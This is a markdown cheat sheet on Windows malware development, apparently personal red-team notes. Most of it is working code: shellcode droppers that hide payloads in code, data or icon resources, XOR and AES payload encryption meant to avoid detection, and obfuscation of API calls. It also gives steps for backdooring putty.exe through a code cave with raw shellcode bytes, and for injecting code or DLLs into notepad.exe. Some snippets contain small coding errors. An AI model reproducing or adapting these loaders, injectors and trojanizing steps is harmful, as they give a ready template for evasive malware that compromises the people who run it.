# Malware Development
## General
- For building start 

## Portable Executable (PE) Files
- Open with PEbear https://github.com/hasherezade/pe-bear
- Interesting sections: `text`(`.txt)`, `data`(`.data`), `resources`(`.rsrc`)

#### EXE vs DLL
- Exe are seperate programs which spawn an independant process
- DLL are modules that are loaded in existing processes

#### Example commandline exe
```
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {

	printf("Test\n");
	
	getchar();
    
	return 0;
}
```

##### Build & Run
```
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

implant.exe
```

#### Example dll
```
#include <Windows.h>
#pragma comment (lib, "user32.lib")


BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

extern "C" {
__declspec(dllexport) BOOL WINAPI RunME(void) {
	
	MessageBox(
		NULL,
		"Test",
		"Message",
        MB_OK
	);
	 
		 return TRUE;
	}
}
```

##### Build & Run
```
cl.exe /D_USRDLL /D_WINDLL implantDLL.cpp /MT /link /DLL /OUT:implant.dll

rundll32 implant.dll,RunME
```

## Payload generation
- A lot of C2 frameworks such as Cobalt Strike, Metasploit etc can create their own payloads.

### Msfvenom
- Change the `-f` parameter to change the payload type. For example  `c` or `csharp`.
- Use `EXITFUNC=thread` to get a clean exit and keep the process running [link](https://www.hacking-tutorial.com/tips-and-trick/what-is-metasploit-exitfunc/).

#### List payload & outputs
```
msfvenom --list payloads
msfvenom --list payloads | grep windows | grep x64

msfvenom --list formats
```

#### calc.exe
```
msfvenom -p windows/exec CMD='calc.exe' -f hex
msfvenom -p windows/x64/exec CMD='calc.exe' -f hex
```

#### Messagebox
```
msfvenom -p windows/x64/messagebox TEXT="0xjs" -o msgbox64.bin
```

## Droppers
- Payloads in droppers can be stored in
	- `.text`, put it inside a function in the code. For example within main.
	- `.data`, set payload read only, inside global variable
	- `.rsrc`, place it in a icon, or image.

#### Example payload in text
- Filename `implant.cpp`
```
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	unsigned char payl[] = { <payl> };
	unsigned int len = sizeof(payl);
	
	// Allocate a memory buffer for payload
	exec_mem = VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Copy payload to new buffer
	RtlMoveMemory(exec_mem, payl, len);
	
	// Make new buffer as executable
	rv = VirtualProtect(exec_mem, len, PAGE_EXECUTE_READ, &oldprotect);

	// Run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
```

##### Build
```
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
```

#### Example payload in data
- Filename `implant.cpp`
```
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char payl[] = { <payl> };
unsigned int len = sizeof(payl);

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	// Allocate a memory buffer for payload
	exec_mem = VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Copy paylload to new buffer
	RtlMoveMemory(exec_mem, payl, len);

	// Make new buffer as executable
	rv = VirtualProtect(exec_mem, len, PAGE_EXECUTE_READ, &oldprotect);

	// Run the paylload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
```

##### Build
```
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
```

#### Example payload in resources
- Requires a `.ico` payload generated (calc.ico in example)
- Filename `implant.cpp`
```
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "resources.h"

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	
	unsigned char * payl;
	unsigned int len;
	
	// Extract payload from resources section
	res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = LoadResource(NULL, res);
	payl = (char *) LockResource(resHandle);
	len = SizeofResource(NULL, res);
	
	// Allocate some memory buffer for payload
	exec_mem = VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Copy payload to new memory buffer
	RtlMoveMemory(exec_mem, payl, len);
	
	// Make the buffer executable
	rv = VirtualProtect(exec_mem, len, PAGE_EXECUTE_READ, &oldprotect);

	// Run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
```

- Filename `resources.h`
```
#define FAVICON_ICO 100
```

- Filename `resources.rc`
```
#include "resources.h"

FAVICON_ICO RCDATA calc.ico
```

##### Build
```
rc resources.rc
cvtres /MACHINE:x64 /OUT:resources.o resources.res
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64 resources.o
```

## Payload encoding & encryption
- Encoding: Mostly used for transfering binary data, for example in Base64
- Encryption: Transform data with a key, for example XOR, AES

### Encoding
### Base64
- Not enough to avoid detection. Mostly used for transfering binary data

#### Base64 encode payload
```
certutil -encode <PAYLOAD>.bin <PAYLOAD>.base64
```

#### Example base64 encoded payload
- Filename `implant.cpp`
```
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Wincrypt.h>
#pragma comment (lib, "Crypt32.lib")

unsigned char payl[] = "<BASE64 PAYLOAD>";
unsigned int len = sizeof(payl);

int DecodeBase64( const BYTE * src, unsigned int srcLen, char * dst, unsigned int dstLen ) {

	DWORD outLen;
	BOOL fRet;

	outLen = dstLen;
	fRet = CryptStringToBinary( (LPCSTR) src, srcLen, CRYPT_STRING_BASE64, (BYTE * )dst, &outLen, NULL, NULL);
	
	if (!fRet) outLen = 0;  // failed
	
	return( outLen );
}


int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	
	// Allocate new memory buffer for payload
	exec_mem = VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Decode the payload back to binary form
	DecodeBase64((const BYTE *)payl, len, (char *) exec_mem, len);
	
	// Make the buffer executable
	rv = VirtualProtect(exec_mem, len, PAGE_EXECUTE_READ, &oldprotect);

	// Run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
```

##### Build
```
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
```

### XOR
#### Xor encrypt payload python2
- Change the `KEY` variable with a key
- Filename `xorencrypt.py`
- Xor encrypts a `.bin` file
```
import sys

KEY = "<KEY>"

def xor(data, key):
	
	key = str(key)
	l = len(key)
	output_str = ""

	for i in range(len(data)):
		current = data[i]
		current_key = key[i % len(key)]
		output_str += chr(ord(current) ^ ord(current_key))
	
	return output_str

def printCiphertext(ciphertext):
	print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')

try:
    plaintext = str(open(sys.argv[1], "rb").read())
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()

ciphertext = xor(plaintext, KEY)
print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')
```

```
python2 xorencryptfavicon.py msgbox64.bin
```

#### Example with XOR encrypted payload
- Change the `key` variable with the key
- Filename `implant.cpp`
```
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	unsigned char payl[] = { <XOR PAYLOAD> };
	unsigned int len = sizeof(payl);
	char key[] = "<KEY>";

	// Allocate a buffer for payload
	exec_mem = VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Decrypt (DeXOR) the payload
	XOR((char *) payl, len, key, sizeof(key));
	
	// Copy the payload to allocated buffer
	RtlMoveMemory(exec_mem, payl, len);
	
	// Make the buffer executable
	rv = VirtualProtect(exec_mem, len, PAGE_EXECUTE_READ, &oldprotect);

	// Run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
```

##### Build
```
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
```

#### Xor encrypt favicon.ico python2
- Change the `KEY` variable with a key
- Filename `xorencryptfavicon.py`
```
import sys

KEY = "mysecretkeee"

def xor(data, key):
	
	key = str(key)
	l = len(key)
	output_str = ""

	for i in range(len(data)):
		current = data[i]
		current_key = key[i % len(key)]
		output_str += chr(ord(current) ^ ord(current_key))
	
	return output_str

def printCiphertext(ciphertext):
	print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')

try:
    plaintext = str(open(sys.argv[1], "rb").read())
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()

ciphertext = xor(plaintext, KEY)
open("favicon.ico", "wb").write(ciphertext)
```

```
python2 xorencryptfavicon.py msgbox64.bin
```

### AES
#### AES encrypt python2
- Filename `aesencrypt.py`
```
import sys
from Crypto.Cipher import AES
from os import urandom
import hashlib

KEY = urandom(16)

def pad(s):
	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

def aesenc(plaintext, key):

	k = hashlib.sha256(key).digest()
	iv = 16 * '\x00'
	plaintext = pad(plaintext)
	cipher = AES.new(k, AES.MODE_CBC, iv)

	return cipher.encrypt(bytes(plaintext))

try:
    plaintext = open(sys.argv[1], "rb").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()

ciphertext = aesenc(plaintext, KEY)
print('AESkey[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in KEY) + ' };')
print('payload[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')
```

```
python2 aesencrypt.py calc.bin
```

#### Example with AES encrypted payload
- Change the `key` variable with a key
- Filename `implant.cpp`
```
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>

int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}


int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	char key[] = { <KEY> };
	unsigned char payl[] = { <AES PAYLOAD> };
	unsigned int len = sizeof(payl);
	
	// Allocate memory for payload
	exec_mem = VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Decrypt payload
	AESDecrypt((char *) payl, len, key, sizeof(key));
	
	// Copy payload to allocated buffer
	RtlMoveMemory(exec_mem, payl, len);
	
	// Make the buffer executable
	rv = VirtualProtect(exec_mem, len, PAGE_EXECUTE_READ, &oldprotect);

	// Run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
```

##### Build
```
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
```

## Function call obfuscation
- Calling external functions, detection based on imported DLLs and functions
- A method of hiding DLL's and external functions that are called during runtime.
	- With the API's `GetModuleHandle` & `GetProcAddress`

#### Run dumpbin to check import adress table
- Print the DLL and the functions
```
dumpbin /import <PAYLOAD EXE>
```

#### Lookup function
- For example: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect and copy the declaration.
```
BOOL VirtualProtect(
  [in]  LPVOID lpAddress,
  [in]  SIZE_T dwSize,
  [in]  DWORD  flNewProtect,
  [out] PDWORD lpflOldProtect
);
```

- Create a global variable and make it a pointer
```
BOOL (WINAPI * pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
```

- Change the code, get the address
```
pVirtualProtect = GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualProtect");
```

- Best is to encrypt the string `VirtualProtect` from the example above. See Droppers for example
  - [XOR](../Dropper_AES_Favicon_Notepad/)
  - [AES](../Dropper_XOR_Favicon_Notepad/)

#### Encode function calls / strings
- Might want to change the function for this
```
python2 -i xorencrypt.py

>>> PrintC(xor("<STRING TO ENCRYPT>", "<KEY">)
```

## Backdoors and Trojans
- Usefull when having read/write to a share of executables. Make sure you keep a copy of the original and place them back!
- Methods of implanting own code:
	- Code Cave
	- New section
	- Extending section

#### Backdooring Putty.exe
1. Download putty.exe https://www.putty.org/
3. Start [x32dbg](https://x64dbg.com/) and click `F3`, open Putty. Go to Breakpoints and click the first one.
4. Scroll down till you see a lot of nullbytes and copy and note down the first adress, optional: set a new breakpoint
	- Example: code cave address: `0045C961`
5. Go back to the first Breakpoint and copy the first lines of instructions
```
00454AD0 | 6A 60                    | push 60                                 |
00454AD2 | 68 B07A4700              | push putty.477AB0                       |
00454AD7 | E8 08210000              | call putty.456BE4                       |
00454ADC | BF 94000000              | mov edi,94                              | edi:"LdrpInitializeProcess"
00454AE1 | 8BC7                     | mov eax,edi                             | edi:"LdrpInitializeProcess"
```
6. Select the first first instruction and press `space`. (or right click and select assemble)
7. Change the instruction to `jump 0x` and then past the cave address. Example: `jmp 0x0045C961`
8. Placing shellcode in the nullbyte area will change the stack and pointers etc. Save all the value of the registers and flags to the stack. Set the following instructions in the first nullbytes:
```
pushad
pushfd
```
9. Select the rest of the nullbyte area and copy the following calc32 hex shellcode, right click the nullbyte area and go to Binary --> Edit. Paste it with the curson at the first `00`
```
fc e8 82 00 00 00 60 89 e5 31 c0 64
8b 50 30 8b 52 0c 8b 52 14 8b 72 28
0f b7 4a 26 31 ff ac 3c 61 7c 02 2c
20 c1 cf 0d 01 c7 e2 f2 52 57 8b 52
10 8b 4a 3c 8b 4c 11 78 e3 48 01 d1
51 8b 59 20 01 d3 8b 49 18 e3 3a 49
8b 34 8b 01 d6 31 ff ac c1 cf 0d 01
c7 38 e0 75 f6 03 7d f8 3b 7d 24 75
e4 58 8b 58 24 01 d3 66 8b 0c 4b 8b
58 1c 01 d3 8b 04 8b 01 d0 89 44 24
24 5b 5b 61 59 5a 51 ff e0 5f 5f 5a
8b 12 eb 8d 5d 6a 01 8d 85 b2 00 00
00 50 68 31 8b 6f 87 ff d5 bb f0 b5
a2 56 68 a6 95 bd 9d ff d5 3c 06 7c
0a 80 fb e0 75 05 bb 47 13 72 6f 6a
00 53 ff d5 63 61 6c 63 2e 65 78 65
00
```
10. Save the changes with `ctrl p`, click "Select All" and "Patch File". Save it as as a different file and run it. Calc.exe will execute!
11. But putty.exe won't run and the process will stop, even though calc.exe spawns. Set a breakpoint at every call by pressing `F2` on every line with `call`.
12. Run though the code till calc.exe spawns and add a comment to the last `call` which spawned calc.exe. Then continue till it exits and change the last call that exited.
13. Select a adress in the nullbyte area. For example `0045CA27`. Change the push before the last call by pressing `space` to `jmp 0x0045CA27`
14. Restore the state of the registers and flags. Set the following instructions at the adress of `0045CA27` and below
```
popfd
popad
```
15. Restore the first two instructions of step 5. Copy the bytes below and select the next empty nullbyte area, click "Binary" -> "Edit" and paste it.
```
6A 60 68 B0 7A 47 00
```
16. Make a jump to the next instruction from step 5. Copy the address (`00454AD7`) and change the next nullybyte to `jmp 0x00454AD7`

## Code injection
- Why do code injection?
	- Escape from a short lived process
	- Change working context
	- Backup C2 channel (Toon, two is one, one is none)
- Classic methods: Shellcode/payload injection w/ debugging Win API or DLL injection

### Injecting code in remote process
- Win32 API functions:
	- `VirtualAllocEx` Allocate memory buffer in remote process
	- `WriteProcessMemory` Write into memory into the remote process
	- `CreateRemoteThread` Specify which process should start the new threat

#### Example Code injection notepad.exe
- Filename: `implant.cpp`
```
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

unsigned char payl[] = { <PAYLOAD> };
unsigned int len = sizeof(payl);

int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}


int Inject(HANDLE hProc, unsigned char * payl, unsigned int len) {

        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;

  
        pRemoteCode = VirtualAllocEx(hProc, NULL, len, MEM_COMMIT, PAGE_EXECUTE_READ);
        WriteProcessMemory(hProc, pRemoteCode, (PVOID)payl, (SIZE_T)len, (SIZE_T *)NULL);
        
        hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
        if (hThread != NULL) {
                WaitForSingleObject(hThread, 500);
                CloseHandle(hThread);
                return 0;
        }
        return -1;
}


int main(void) {
    
	int pid = 0;
    HANDLE hProc = NULL;

	pid = FindTarget("notepad.exe");

	if (pid) {
		printf("Notepad.exe PID = %d\n", pid);

		// try to open target process
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			Inject(hProc, payl, len);
			CloseHandle(hProc);
		}
	}
	return 0;
}
```

##### Build
```
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
```

### Injecting DLL in remote process
- Win32 API functions:
	- `GetProcAddress` Get Loadlibrary address from the dropper
	- `VirtualAllocEx` Allocate memory buffer in remote process [link](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
	- `WriteProcessMemory` Write DLL Address into the memory of remote process
	- `CreateRemoteThread` Specify which process should start the new threat

#### Example dll
- Filename: `implantDLL.cpp`
```
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char payl[] = { <PAYLOAD> };
unsigned int len = sizeof(payl);

extern __declspec(dllexport) int Go(void);
int Go(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	exec_mem = VirtualAlloc(0, char len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	RtlMoveMemory(exec_mem, char payl, char len);
	
	rv = VirtualProtect(exec_mem, char len, PAGE_EXECUTE_READ, &oldprotect);

	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, 0);
	}
	return 0;
}


BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved ) {

	switch ( fdwReason ) {
			case DLL_PROCESS_ATTACH:
					Go();
					break;
			case DLL_THREAD_ATTACH:
					break;
			case DLL_THREAD_DETACH:
					break;
			case DLL_PROCESS_DETACH:
					break;
			}
	return TRUE;
}
```

##### Build
```
cl.exe /O2 /D_USRDLL /D_WINDLL implantDLL.cpp implantDLL.def /MT /link /DLL /OUT:implantDLL.dll
```

#### Example Dropper
- Filename: `injectDLL.cpp`
- Change `dll` parameter with the DLL path
```
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}

int main(int argc, char *argv[]) {
	
	HANDLE pHandle;
	PVOID remBuf;
	PTHREAD_START_ROUTINE pLoadLibrary = NULL;
	char dll[] = "<DLL PATH>";
	char target[] = "notepad.exe";
	int pid = 0;
	
	
	pid = FindTarget(target);
	if ( pid == 0) {
		printf("Target NOT FOUND! Exiting.\n");
		return -1;
	}

	printf("Target PID: [ %d ]\nInjecting...", pid);

	pLoadLibrary = (PTHREAD_START_ROUTINE) GetProcAddress( GetModuleHandle("Kernel32.dll"), "LoadLibraryA");

	pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)(pid));

	if (pHandle != NULL) {
		remBuf = VirtualAllocEx(pHandle, NULL, sizeof dll, MEM_COMMIT, PAGE_READWRITE);	
	
		WriteProcessMemory(pHandle, remBuf, (LPVOID) dll, sizeof(dll), NULL);

		CreateRemoteThread(pHandle, NULL, 0, pLoadLibrary, remBuf, 0, NULL);
		printf("done!\nremBuf addr = %p\n", remBuf);

		CloseHandle(pHandle); 
	}
	else {
		printf("OpenProcess failed! Exiting.\n");
		return -2;
	}
}
```

##### Build
```
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /TcinjectDLL.cpp /link /OUT:injectDLL.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
```

## Making a program invisible
- Two typical ways: `Freeconsole()` (Console window shows up a split second) and `GUItrick`

#### Example Freeconsole
```
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

unsigned char payl[] = { <PAYLOAD> };
unsigned int len = sizeof(payl);

int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}


int Inject(HANDLE hProc, unsigned char * payl, unsigned int len) {

        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;

  
        pRemoteCode = VirtualAllocEx(hProc, NULL, len, MEM_COMMIT, PAGE_EXECUTE_READ);
        WriteProcessMemory(hProc, pRemoteCode, (PVOID)payl, (SIZE_T)len, (SIZE_T *)NULL);
        
        hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
        if (hThread != NULL) {
                WaitForSingleObject(hThread, 500);
                CloseHandle(hThread);
                return 0;
        }
        return -1;
}


int main(void) {
    
	int pid = 0;
    HANDLE hProc = NULL;

	FreeConsole();
	pid = FindTarget("notepad.exe");

	if (pid) {
		// try to open target process
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			Inject(hProc, payl, len);
			CloseHandle(hProc);
		}
	}
	return 0;
}
```

##### Build
```
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
```

#### Example GUItrick
- Instead of the `main` function create a `WinMain` function

```
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
    LPSTR lpCmdLine, int nCmdShow) {
```

```
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

unsigned char payl[] = { <PAYLOAD> };
unsigned int len = sizeof(payl);

int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}


int Inject(HANDLE hProc, unsigned char * payl, unsigned int len) {

        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;

  
        pRemoteCode = VirtualAllocEx(hProc, NULL, len, MEM_COMMIT, PAGE_EXECUTE_READ);
        WriteProcessMemory(hProc, pRemoteCode, (PVOID)payl, (SIZE_T)len, (SIZE_T *)NULL);
        
        hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
        if (hThread != NULL) {
                WaitForSingleObject(hThread, 500);
                CloseHandle(hThread);
                return 0;
        }
        return -1;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
    LPSTR lpCmdLine, int nCmdShow) {
    
	int pid = 0;
    HANDLE hProc = NULL;

	pid = FindTarget("notepad.exe");

	if (pid) {
		// try to open target process
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			Inject(hProc, payload, payload_len);
			CloseHandle(hProc);
		}
	}
	return 0;
}
```

##### Build
- Use `/SUBSYSTEM:WINDOWS`
```
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:WINDOWS /MACHINE:x64
```

## Droppers

### Dropper XOR Favicon
- LINK HERE

#### Generate messagebox
```
msfvenom -p windows/x64/messagebox TEXT="0xjs" -o msgbox64.bin
```

#### XOR encrypt messagebox
- Change the key in script if desired
```
python2 xorencryptfavicon.py msgbox64.bin
```

#### XOR encrypt function calls / strings
- Might want to change the function for this
```
python2 -i xorencrypt.py

>>> PrintC(xor("<STRING TO ENCRYPT>", "<KEY">)
```

#### See implant.cpp
- LINK HERE

#### Compile
```
rc resources.rc
cvtres /MACHINE:x64 /OUT:resources.o resources.res
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:WINDOWS /MACHINE:x64 resources.o
```

### Dropper AES Favicon
- LINK HERE

#### Generate messagebox
```
msfvenom -p windows/x64/messagebox TEXT="0xjs" -o msgbox64.bin
```

#### AES encrypt messagebox
- Change the key in script if desired
```
python.exe .\aesencryptfile.py .\msgbox64.bin
```

#### AES encrypt function calls / strings
- Might want to change the function for this
```
python.exe .\aesencryptstring.py
```

#### See implant.cpp
- LINK HERE

#### Compile
```
rc resources.rc
cvtres /MACHINE:x64 /OUT:resources.o resources.res
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:WINDOWS /MACHINE:x64 resources.o
